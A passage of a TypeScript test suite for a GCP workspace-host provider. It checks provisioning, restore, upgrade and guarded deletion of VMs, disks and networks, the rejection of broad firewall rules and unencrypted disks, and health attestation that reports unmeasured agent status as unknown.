    const { host } = await provision(client, provider, spec);
    expect(client.insertFirewallCalls).toHaveLength(0);
    const profile = await provider.getTransportProfile(
      host,
      context({ transportPreference: 'defguard-ssh', defguardAddress: '10.42.0.8' }),
    );
    expect(profile).toMatchObject({ kind: 'defguard-ssh', audited: true });
    expect(profile.endpoint).toContain('ssh://10.42.0.8:22?');
    expect(profile.constraints).toContain('No public IP or inbound GCP firewall rule');
  });

  it('rejects broad or caller-defined firewall policy instead of exposing operator services', async () => {
    const { provider } = providerAndClient();
    const broad = desired();
    broad.transportPreference = 'gcp-direct-ssh';
    broad.provider = { ...broad.provider, directSshSourceRanges: ['0.0.0.0/0'] };
    await expect(
      provider.plan({ action: 'provision', operationId: 'broad', idempotencyKey: 'broad', desired: broad }, context()),
    ).rejects.toThrow('restricted IPv4 CIDRs');

    const arbitraryPorts = desired();
    arbitraryPorts.provider = {
      ...arbitraryPorts.provider,
      network: { ...(arbitraryPorts.provider!.network as object), allowedTcpPorts: ['22', '3070', '5432'] },
    };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'ports', idempotencyKey: 'ports', desired: arbitraryPorts },
        context(),
      ),
    ).rejects.toThrow('sourceRanges/allowedTcpPorts are forbidden');
  });

  it('refuses dependent Compute Engine calls until prerequisite identities have been persisted', async () => {
    const { client, provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'operation-2', idempotencyKey: 'operation-2', desired: desired() },
      context(),
    );
    await expect(
      provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-subnetwork')!,
          knownResources: [],
        },
        context(),
      ),
    ).rejects.toThrow('requires a persisted network resource identity');
    expect(client.insertSubnetworkCalls).toHaveLength(0);

    const disk = requireAppliedResource(
      await provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-data-disk')!,
          knownResources: [],
        },
        context(),
      ),
    );
    await expect(
      provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-instance')!,
          knownResources: [disk],
        },
        context(),
      ),
    ).rejects.toThrow('requires a persisted subnetwork/existing-subnetwork resource identity');
    expect(client.insertInstanceCalls).toHaveLength(0);
  });

  it('records but never owns or deletes explicitly selected existing network resources', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider, desired('existing'));
    expect(resources.map((item) => item.kind)).toEqual([
      'existing-network',
      'existing-subnetwork',
      'existing-firewall',
      'disk',
      'vm',
    ]);
    expect(client.insertNetworkCalls).toHaveLength(0);
    expect(client.insertSubnetworkCalls).toHaveLength(0);
    expect(client.insertFirewallCalls).toHaveLength(0);
    const destroy = await provider.plan(
      {
        action: 'destroy',
        operationId: 'destroy-existing',
        idempotencyKey: 'destroy-existing',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    expect(destroy.steps.map((step) => step.resourceKind)).toEqual(['vm', 'disk']);
  });

  it('restores a managed READY snapshot into a distinct encrypted disk and replacement host', async () => {
    const { client, provider } = providerAndClient();
    client.seedSnapshot('pc-host-gcp-1-q3', 'host-gcp-1');
    const sourceHost: WorkspaceHostRef = {
      hostId: 'host-gcp-1',
      target: 'gcp',
      resources: [
        {
          target: 'gcp',
          kind: 'disk',
          providerId: 'pc-host-gcp-1-data',
          parentProviderId: 'papercusp-dev-123',
          zone: 'us-central1-a',
        },
      ],
    };
    const recovered = desired();
    recovered.hostId = 'host-gcp-recovered';
    recovered.provider = {
      ...recovered.provider,
      network: {
        mode: 'managed',
        networkName: 'pc-host-gcp-recovered-net',
        subnetworkName: 'pc-host-gcp-recovered-subnet',
        firewallName: 'pc-host-gcp-recovered-iap',
        ipCidrRange: '10.132.13.0/24',
      },
      instanceName: 'pc-host-gcp-recovered-vm',
      dataDiskName: 'pc-host-gcp-recovered-data',
    };
    const snapshotKey =
      'projects/papercusp-dev-123/locations/us-central1/keyRings/workspaces/cryptoKeys/snapshot-source';
    const plan = await provider.plan(
      {
        action: 'restore',
        operationId: 'restore-1',
        idempotencyKey: 'restore-1',
        host: sourceHost,
        snapshot: {
          target: 'gcp',
          providerId: 'projects/papercusp-dev-123/global/snapshots/pc-host-gcp-1-q3',
          hostId: sourceHost.hostId,
          encryptionKeyRef: snapshotKey,
        },
        desired: recovered,
      },
      context(),
    );

    expect(provider.capabilities.lifecycle.restore).toBe(true);
    expect(plan.hostId).toBe(recovered.hostId);
    expect(plan.steps.every(({ action, destructive }) => action === 'restore' && destructive === false)).toBe(true);
    const disk = (
      plan.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as {
        request: GcpDiskInsertInput;
      }
    ).request;
    expect(disk).toMatchObject({
      name: 'pc-host-gcp-recovered-data',
      sourceSnapshot: 'projects/papercusp-dev-123/global/snapshots/pc-host-gcp-1-q3',
      sourceSnapshotEncryptionKey: { kmsKeyName: snapshotKey },
      diskEncryptionKey: { kmsKeyName: expect.any(String) },
      labels: { 'papercusp-host-id': recovered.hostId },
    });
    expect(plan.steps.map(({ id }) => id)).not.toContain('delete-data-disk');
    expect(plan.steps.map(({ id }) => id)).not.toContain('delete-instance');
  });

  it('fails closed for unencrypted data, cross-project ambiguity, and implicit live clients', async () => {
    const { provider } = providerAndClient();
    const unencrypted = desired();
    unencrypted.data = { ...unencrypted.data, encrypted: false };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-1', idempotencyKey: 'unsafe-1', desired: unencrypted },
        context(),
      ),
    ).rejects.toThrow('data disks must be encrypted');

    const crossProject = desired();
    crossProject.provider = { ...crossProject.provider, projectId: 'other-project-123' };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-2', idempotencyKey: 'unsafe-2', desired: crossProject },
        context(),
      ),
    ).rejects.toThrow('projectId must match desired.scope.id');

    const mutableFamily = desired();
    mutableFamily.image = {
      id: 'projects/papercusp-images/global/images/family/papercusp-workspace-host',
    };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-3', idempotencyKey: 'unsafe-3', desired: mutableFamily },
        context(),
      ),
    ).rejects.toThrow('family aliases are forbidden');
    expect(() => createGcpWorkspaceHostProvider({ client: undefined as never })).toThrow('requires an injected');
  });

  it('uses provider-managed encryption by default and treats a customer-managed key as an explicit option', async () => {
    const { provider } = providerAndClient();
    const withoutCmk = desired();
    withoutCmk.provider = { ...withoutCmk.provider, kmsKeyName: undefined };
    const plan = await provider.plan(
      { action: 'provision', operationId: 'no-cmk', idempotencyKey: 'no-cmk', desired: withoutCmk },
      context(),
    );
    const disk = (
      plan.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as {
        request: GcpDiskInsertInput;
      }
    ).request;
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as {
        request: GcpInstanceInsertInput;
      }
    ).request;
    expect(disk).not.toHaveProperty('diskEncryptionKey');
    expect(instance.disks[0].initializeParams).not.toHaveProperty('diskEncryptionKey');
  });
});

describe('GCP workspace-host provider contract and lifecycle', () => {
  it('passes the shared fake contract with reconciliation, observation, IAP transport, and confirmed deletion', async () => {
    const { provider } = providerAndClient();
    const report = await runFakeWorkspaceHostProviderContractSuite(provider, {
      adapterKind: 'fake',
      reportRef: 'artifact://workspace-host/gcp/provider-contract-1',
      context: context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      desired: desired(),
      operationId: 'contract-operation',
      idempotencyKey: 'contract-operation',
      confirmedBy: 'vitest',
      now: () => NOW,
    });
    expect(report.passed).toBe(true);
    expect(report.checks).toEqual(WORKSPACE_HOST_PROVIDER_CONTRACT_CHECKS);
    expect(report.provisionedResources.map((item) => item.kind)).toEqual([
      'network',
      'subnetwork',
      'firewall',
      'router',
      'nat',
      'disk',
      'vm',
    ]);
    expect(report.destroyConfirmations.map((item) => item.providerResourceId)).toEqual([
      'pc-host-gcp-1-vm',
      'pc-host-gcp-1-data',
      'pc-host-gcp-1-iap',
      'pc-host-gcp-1-nat',
      'pc-host-gcp-1-router',
      'pc-host-gcp-1-subnet',
      'pc-host-gcp-1-net',
    ]);
  });

  it('polls scoped operations for stop/start/restart/snapshot/repair and freshly confirms every delete', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const actions = ['stop', 'start', 'restart', 'snapshot', 'repair'] as const;
    for (const action of actions) {
      const plan = await provider.plan(
        action === 'snapshot'
          ? {
              action,
              operationId: `operation:${action}`,
              idempotencyKey: `operation:${action}`,
              host,
              name: 'manual-snapshot',
            }
          : { action, operationId: `operation:${action}`, idempotencyKey: `operation:${action}`, host },
        context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      );
      for (const step of plan.steps) {
        const result = await provider.apply(
          { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
          context(),
        );
        expect(result.state).toBe('applied');
      }
    }
    expect({
      start: client.startCalls,
      stop: client.stopCalls,
      reset: client.resetCalls,
      metadataRefreshes: client.setInstanceMetadataCalls.length,
      snapshots: client.snapshotCalls.length,
    }).toEqual({ start: 2, stop: 2, reset: 2, metadataRefreshes: 1, snapshots: 1 });
    expect(
      client.setInstanceMetadataCalls[0]?.input.items.find(({ key }) => key === 'startup-script')?.value,
    ).toContain('echo current-controller-bootstrap');
    expect(client.snapshotCalls[0]?.input.labels).toEqual({
      'papercusp-host-id': 'host-gcp-1',
      'papercusp-managed': 'true',
      'papercusp-workspace-id': 'workspace-gcp-1',
    });
    expect(client.waitedOperations.length).toBeGreaterThanOrEqual(10);

    const destroy = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:destroy',
        idempotencyKey: 'operation:destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    expect(destroy.steps.map(({ resourceKind }) => resourceKind)).toEqual([
      'vm',
      'disk',
      'firewall',
      'nat',
      'router',
      'subnetwork',
      'network',
    ]);
    const natDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'nat')!;
    const routerDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'router')!;
    const subnetworkDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'subnetwork')!;
    const networkDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'network')!;
    expect(routerDelete.dependsOn).toContain(natDelete.id);
    expect(subnetworkDelete.dependsOn).toContain(routerDelete.id);
    expect(networkDelete.dependsOn).toContain(subnetworkDelete.id);
    for (const step of destroy.steps) {
      const result = await provider.apply(
        { planId: destroy.planId, operationId: destroy.operationId, step, knownResources: resources },
        context(),
      );
      expect(result.state).toBe('destroyed');
      if (result.state === 'destroyed') expect(result.confirmation.source).toBe('provider-read');
    }
    expect(client.deleteCalls).toBe(7);
    await expect(
      provider.reconcile(
        {
          planId: destroy.planId,
          operationId: destroy.operationId,
          step: natDelete,
          knownResources: resources,
          reason: 'resume',
        },
        context(),
      ),
    ).resolves.toMatchObject({ state: 'destroyed', confirmation: { source: 'provider-read' } });
    expect(client.deleteCalls).toBe(7);
  });

  it('reconciles an ambiguous instance insert by fresh resource read without a duplicate API mutation', async () => {
    const { client, provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'operation-3', idempotencyKey: 'operation-3', desired: desired() },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }
    const instanceStep = plan.steps.at(-1)!;
    const reconciled = await provider.reconcile(
      {
        planId: plan.planId,
        operationId: plan.operationId,
        step: instanceStep,
        knownResources: resources,
        reason: 'ambiguous-timeout',
        previousProviderRequestId: 'operation-5',
      },
      context(),
    );
    expect(reconciled.state).toBe('unchanged');
    expect('resource' in reconciled && reconciled.resource?.providerId).toBe('pc-host-gcp-1-vm');
    expect(client.insertInstanceCalls).toHaveLength(1);
  });

  it('upgrades by replacing only the boot/runtime VM and reattaching the exact retained data disk', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    await expect(
      provider.plan(
        {
          action: 'upgrade',
          operationId: 'operation:mutable-upgrade',
          idempotencyKey: 'operation:mutable-upgrade',
          host,
          image: { id: 'projects/papercusp/global/images/family/papercusp-workspace-host' },
        },
        context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      ),
    ).rejects.toThrow('family aliases are forbidden');
    const plan = await provider.plan(
      {
        action: 'upgrade',
        operationId: 'operation:upgrade',
        idempotencyKey: 'operation:upgrade',
        host,
        image: { id: 'projects/papercusp/global/images/papercusp-v2' },
      },
      context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
    );
    expect(plan.steps.map(({ id, dependsOn }) => ({ id, dependsOn }))).toEqual([
      { id: 'delete-boot-runtime', dependsOn: [] },
      { id: 'create-boot-runtime', dependsOn: ['delete-boot-runtime'] },
    ]);
    for (const step of plan.steps) {
      await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
    }
    const replacement = client.insertInstanceCalls.at(-1)!.input;
    expect(replacement.disks[0].initializeParams.sourceImage).toBe('projects/papercusp/global/images/papercusp-v2');
    expect(replacement.disks[1]).toMatchObject({
      autoDelete: false,
      source: 'projects/papercusp-dev-123/zones/us-central1-a/disks/pc-host-gcp-1-data',
    });
    expect(await client.getDisk('papercusp-dev-123', 'us-central1-a', 'pc-host-gcp-1-data')).toMatchObject({
      status: 'READY',
      attachedInstanceNames: ['pc-host-gcp-1-vm'],
    });
  });

  it('refuses to delete a data disk with a foreign attachment or mismatched host labels', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const plan = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:safe-destroy',
        idempotencyKey: 'operation:safe-destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    const deleteVm = plan.steps.find(({ resourceKind }) => resourceKind === 'vm')!;
    const deleteDisk = plan.steps.find(({ resourceKind }) => resourceKind === 'disk')!;
    await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: deleteVm, knownResources: resources },
      context(),
    );
    client.rewriteDisk('pc-host-gcp-1-data', { attachedInstanceNames: ['foreign-vm'] });
    await expect(
      provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step: deleteDisk, knownResources: resources },
        context(),
      ),
    ).rejects.toThrow('still attached to foreign-vm');
    client.rewriteDisk('pc-host-gcp-1-data', {
      attachedInstanceNames: [],
      labels: { 'papercusp-managed': 'true', 'papercusp-host-id': 'another-host' },
    });
    await expect(
      provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step: deleteDisk, knownResources: resources },
        context(),
      ),
    ).rejects.toThrow("not labeled as managed by workspace host 'host-gcp-1'");
  });

  it('refuses to delete a managed Router while a foreign NAT remains attached', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    client.seedForeignNat('pc-host-gcp-1-router', 'foreign-nat');
    const plan = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:foreign-nat',
        idempotencyKey: 'operation:foreign-nat',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    for (const step of plan.steps) {
      if (step.resourceKind === 'router') {
        await expect(
          provider.apply(
            { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
            context(),
          ),
        ).rejects.toThrow('still contains NAT configuration(s): foreign-nat');
        break;
      }
      await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
    }
  });
});

describe('GCP workspace-host health attestation (WI-2143924)', () => {
  it('reports unknown — never degraded — when nothing produced agentOnline', async () => {
    // The whole defect in one assertion. `agentOnline` has no producer on the GCP path, so
    // reading it as `=== true` reported a RUNNING, fully-provisioned host as `degraded` and
    // made `healthy` unreachable — a caller gating on health would have hung forever.
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);

    const health = await provider.attestHealth(host, context());

    expect(health.status).toBe('unknown');
    expect(health.checks).toContainEqual({
      name: 'workspace-agent-online',
      ok: null,
      detail: 'no producer writes agentOnline on the GCP path',
    });
    expect(health.checks).toContainEqual({ name: 'compute-running', ok: true, detail: 'RUNNING' });
  });

  it('does not let observe and attestHealth disagree about the same unmeasured field', async () => {
    // Before the fix these read one unset field in OPPOSITE directions — `observe` as
    // `=== false` (so: running) and `attestHealth` as `=== true` (so: degraded) — and one
    // healthy host was simultaneously both. Neither may now claim a measurement was made.
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);

    const [observation, health] = await Promise.all([
      provider.observe(host, context()),
      provider.attestHealth(host, context()),
    ]);

    expect(observation.state).toBe('running');
    expect(health.status).not.toBe('degraded');
    expect(health.status).not.toBe('healthy');
  });

  it('reports healthy once the agent signal is genuinely measured and passing', async () => {
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);
    const vm = host.resources.find((resource) => resource.kind === 'vm')!;
    client.setAgentOnline(vm.providerId, true);

    const health = await provider.attestHealth(host, context());

    expect(health.status).toBe('healthy');
    expect(health.checks).toContainEqual({ name: 'workspace-agent-online', ok: true });
  });

  it('reports degraded — and demotes the lifecycle state — for a MEASURED offline agent', async () => {
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);
    const vm = host.resources.find((resource) => resource.kind === 'vm')!;
    client.setAgentOnline(vm.providerId, false);

    const [observation, health] = await Promise.all([
      provider.observe(host, context()),
      provider.attestHealth(host, context()),
    ]);

    expect(health.status).toBe('degraded');
    expect(observation.state).toBe('degraded');
  });
});
